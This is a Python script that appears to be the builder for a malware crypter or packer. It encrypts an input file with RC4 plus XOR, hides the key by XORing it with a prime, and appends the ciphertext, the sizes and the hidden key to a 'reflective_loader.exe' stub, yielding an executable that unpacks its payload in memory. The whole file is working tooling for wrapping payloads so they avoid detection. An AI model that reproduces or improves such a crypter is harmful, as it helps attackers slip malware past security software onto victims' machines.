import os
import sys
from Crypto.Cipher import ARC4
import hashlib
import random
import binascii
import shutil

KEY_LENGTH = 16
PRIME_LENGTH = 8
PRIME_TOP = 60124

def prime_number(n):
    is_prime = [True] * (n+1)
    is_prime[0] = is_prime[1] = False
    for number in range(2, int(n**0.5)+1):
        if is_prime[number]:
            for multiple in range(number*number, n+1, number):
                is_prime[multiple] = False
    return max([number for number, prime in enumerate(is_prime) if prime])


def encrypt_file_rc4_xor(input_data):
    # Get Key from random hash bytes
    hash_object = hashlib.sha256(input_data)
    hash_bytes = hash_object.digest()
    start_pos = random.randint(0, len(hash_bytes) - KEY_LENGTH)
    key = hash_bytes[start_pos:start_pos + KEY_LENGTH]

    prime_num = prime_number(PRIME_TOP)
    print("Last prime: ", prime_num)

    cipher = ARC4.new(key)
    rc4_crypted_data = cipher.encrypt(input_data)

    xor_crypted_data = bytearray()
    for i in range(len(rc4_crypted_data)):
        key_byte = key[i % KEY_LENGTH]
        encrypted_byte = rc4_crypted_data[i] ^ key_byte
        xor_crypted_data.append(encrypted_byte)

    # Obfuscate key
    obfu_key = bytearray()
    prime_num_bytes = prime_num.to_bytes(PRIME_LENGTH, byteorder='little')
    for i in range(KEY_LENGTH):
        prime_byte = prime_num_bytes[i % PRIME_LENGTH]
        encrypted_key_byte = key[i] ^ prime_byte
        obfu_key.append(encrypted_key_byte)

    key_hex_str = binascii.hexlify(key).decode()
    obfu_key_hex_str = binascii.hexlify(obfu_key).decode()
    print("Used Key: ", key_hex_str)
    print("Obfuscated Key: ", obfu_key_hex_str)

    return (xor_crypted_data, obfu_key_hex_str)
    
def main():
    if len(sys.argv) != 3:
        print(f"Usage: python {sys.argv[0]} input_file_path output_file_path")
        sys.exit(1)

    input_file_path = sys.argv[1]
    output_file_path = sys.argv[2]

    with open(input_file_path, 'rb') as input_file:
        input_data = input_file.read()

    (encrypted_data, key_str) = encrypt_file_rc4_xor(input_data)

    current_dir = os.getcwd()
    loader_path = os.path.join(current_dir, "reflective_loader.exe")

    with open(loader_path, "rb") as loader_file:
        loader_data = loader_file.read()

    encrypted_size = len(encrypted_data)
    loader_size = len(loader_data)
    print("loader size: ", loader_size)
    print("encrypted size: ", encrypted_size)
    with open(output_file_path, "wb") as new_loader_file:
        new_loader_file.write(loader_data)
        new_loader_file.write(encrypted_data)
        new_loader_file.write(loader_size.to_bytes(8, byteorder='little'))
        new_loader_file.write(encrypted_size.to_bytes(8, byteorder='little'))
        new_loader_file.write(key_str.encode('ascii'))


if __name__ == '__main__':
    main()
